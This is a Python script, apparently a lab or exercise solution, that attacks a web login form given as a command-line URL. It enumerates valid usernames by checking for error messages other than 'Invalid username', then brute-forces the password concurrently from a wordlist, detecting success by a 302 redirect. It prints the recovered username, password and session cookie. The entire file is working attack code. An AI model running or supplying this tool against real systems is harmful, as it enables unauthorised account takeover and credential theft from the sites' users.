import sys
from bs4 import BeautifulSoup
import asyncio
import aiohttp
import time


async def request_password(session: aiohttp.ClientSession, url: str, username: str, password: str) -> None or (str, str):
    # Create async task
    async with session.post(url, data={'username':username, 'password':password}, allow_redirects=False) as response:
        # Check to see if we get a redirect
        if response.status == 302:
            return password, response.cookies['session'].value


async def request_passwords(url: str, passwords: list, username: str) -> list:
    # Create the async session
    async with aiohttp.ClientSession() as session:
        tasks = []
        # Iterate through passwords
        for password in passwords:
            # Remove newline from password
            password = password.split()[0]
            # Create each task (requesting the password)
            task = asyncio.ensure_future(request_password(session, url, username, password))
            # Append each task to our list of tasks
            tasks.append(task)
        # Go through and complete all tasks
        responses = await asyncio.gather(*tasks, return_exceptions=True)
        return responses


def crack_password(url: str, username: str) -> str:
    # Open passwords file for reading
    passwords = open('passwords.txt', 'r')
    # Try all of the passwords asynchronously
    responses = asyncio.get_event_loop().run_until_complete(request_passwords(url, passwords, username))
    # Only the valid password will be returned. Weed out all of the empty responses
    password, session_cookie = [i for i in responses if i != None][0]

    return password, session_cookie


async def request_username(session: aiohttp.ClientSession, url: str, username: str) -> None or str:
    # Create Async task
    async with session.post(url, data={'username':username, 'password':'a'}) as response:
        # Parse out error message
        response = await response.text()
        soup = BeautifulSoup(response, 'html.parser')
        error_message = soup.find("p", {"class": "is-warning"}).get_text()
        # If we get an anomalous error message, return the username
        if error_message != "Invalid username":
            return username


async def request_usernames(url: str, usernames: list) -> list:
    # Create the async session
    async with aiohttp.ClientSession() as session:
        tasks = []
        # Iterate through usernames
        for username in usernames:
            # Remove newline from username
            username = username.split()[0]
            # Create each task (requesting the username)
            task = asyncio.ensure_future(request_username(session, url, username))
            # Append each task to our list of tasks
            tasks.append(task)
        # Go through and complete all tasks
        responses = await asyncio.gather(*tasks, return_exceptions=True)
        return responses


def crack_username(url: str) -> str:
    # Open usernames file for reading
    usernames = open('usernames.txt', 'r')
    # Try all of the usernames asynchronously
    responses = asyncio.get_event_loop().run_until_complete(request_usernames(url, usernames))
    # Only the valid username will be returned. Weed out all of the empty responses
    username = [i for i in responses if i != None][0]
    return username


def main():
    start_time = time.time()
    # Ensure that the proper arguments are provided
    if len(sys.argv) != 2:
        print("Please include the URL to the login page")
        return
    # Retrieve URL from the command-line arguments
    url = sys.argv[1]

    username = crack_username(url)
    password, session_cookie = crack_password(url, username)

    print(f"{username}:{password}")
    print(session_cookie)

    duration = time.time() - start_time
    print(f"Total runtime: {duration} seconds")


if __name__ == "__main__":
    main()